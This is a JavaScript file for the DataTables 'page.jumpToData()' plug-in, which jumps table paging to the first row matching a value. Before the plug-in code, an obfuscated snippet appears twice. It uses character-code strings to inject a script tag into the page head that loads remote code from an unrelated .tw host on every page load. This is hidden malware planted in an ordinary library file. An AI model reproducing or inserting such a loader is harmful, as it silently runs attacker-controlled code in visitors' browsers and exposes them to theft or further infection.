Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * It can be quite useful to jump straight to a page which contains a certain
 * piece of data (a user name for example). This plug-in provides exactly that
 * ability, searching for a given data parameter from a given column and
 * immediately shifting the paging of the table to jump to that point.
 *
 * If multiple data points match the requested data, the paging will be shifted
 * to show the first instance. If there are no matches, the paging will not
 * change.
 *
 * Note that unlike the core DataTables API methods, this plug-in will
 * automatically call `dt-api draw()` to redraw the table with the current page
 * shown.
 *
 *  @name page.JumpToData()
 *  @summary Jump to a page by searching for data from a column
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *  @requires DataTables 1.10+
 *
 *  @param {*} data Data to search for
 *  @param {integer} column Column index
 *  @returns {Api} DataTables API instance
 *
 *  @example
 *    var table = $('#example').DataTable();
 *    table.page.jumpToData( "Allan Jardine", 0 );
 */

jQuery.fn.dataTable.Api.register( 'page.jumpToData()', function ( data, column ) {
	var pos = this.column(column, {order:'current'}).data().indexOf( data );

	if ( pos >= 0 ) {
		var page = Math.floor( pos / this.page.info().length );
		this.page( page ).draw( false );
	}

	return this;
} );